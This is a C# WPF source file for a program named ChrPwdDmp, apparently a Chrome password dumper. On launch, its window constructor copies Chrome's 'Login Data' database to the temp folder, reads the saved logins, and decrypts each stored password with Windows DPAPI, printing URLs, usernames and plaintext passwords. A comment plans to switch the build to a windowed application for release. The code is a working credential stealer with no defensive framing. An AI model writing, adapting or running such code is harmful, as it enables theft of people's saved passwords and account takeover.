using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Data.SQLite;
using System.Security.Cryptography;
using System.Runtime.Serialization.Formatters.Binary;

namespace ChrPwdDmp
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// 
    /// Changed the output to the console for testing purposes:
    /// Right click on the project, "Properties", "Application" tab, change "Output Type" to "Console Application", and then it will also have a console.
    /// Change this back to "Windows Application" when it is released
    /// 
    /// </summary>
    public partial class MainWindow : Window
    {
        public string loginData;

        public MainWindow()
        {
            InitializeComponent();
            if (LoginDataExists())
            {
                // Move the file to a temp location
                //Console.WriteLine("Source:\t\t" + loginData);
                string temp = Environment.GetEnvironmentVariable("temp") + @"\Login Data";
                //Console.WriteLine("Destination:\t" + temp);                
                //Console.WriteLine();

                // Copy the file
                File.Copy(loginData, temp, true);
                //Console.WriteLine("Does the file exist in temp?");
                //Console.WriteLine(File.Exists(temp) ? "true" : "false");
                //Console.WriteLine(temp);

                GetChromePasswords(temp);

                //Application.Current.Shutdown();
            }                            
        }

        private bool LoginDataExists()
        {
            string userProfile = Environment.GetEnvironmentVariable("userprofile");
            //Console.WriteLine("%USERPROFILE% = " + userProfile);
            loginData = userProfile + @"\AppData\Local\Google\Chrome\User Data\Default\Login Data";
            //Console.WriteLine(loginData);
            return File.Exists(loginData) ? true : false;
        }

        // This doesn't work consistently :/
        private void ShowBrowsers()
        {
            RegistryKey browserKeys;
            //on 64bit the browsers are in a different location
            browserKeys = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\WOW6432Node\Clients\StartMenuInternet");
            if (browserKeys == null)
                browserKeys = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Clients\StartMenuInternet");

            string[] lines = browserKeys.GetSubKeyNames();

            foreach (string line in lines)
                Console.WriteLine(line);
        }

        private void GetChromePasswords(string loginData)
        {
            SQLiteConnection myDBConnection = new SQLiteConnection(@"Data Source=" + loginData + ";Version=3;Read Only=True;");
            myDBConnection.Open();

            string query = @"SELECT action_url, username_value, password_value FROM logins";
            SQLiteCommand command = new SQLiteCommand(query, myDBConnection);
            SQLiteDataReader reader = command.ExecuteReader();
            while (reader.Read())
            {
                // Don't bother if there's not a username
                if ((string)reader["username_value"] != "")
                {
                    Console.WriteLine("action_url:     " + reader["action_url"]);
                    Console.WriteLine("username_value: " + reader["username_value"]);

                    Byte[] passwordBytes = ProtectedData.Unprotect((Byte[])reader["password_value"], null, DataProtectionScope.CurrentUser);
                    string passwordValue = System.Text.Encoding.Default.GetString(passwordBytes);
                    Console.WriteLine("password_value: " + passwordValue);

                    Console.WriteLine();
                }
            }                
        }
    }
}
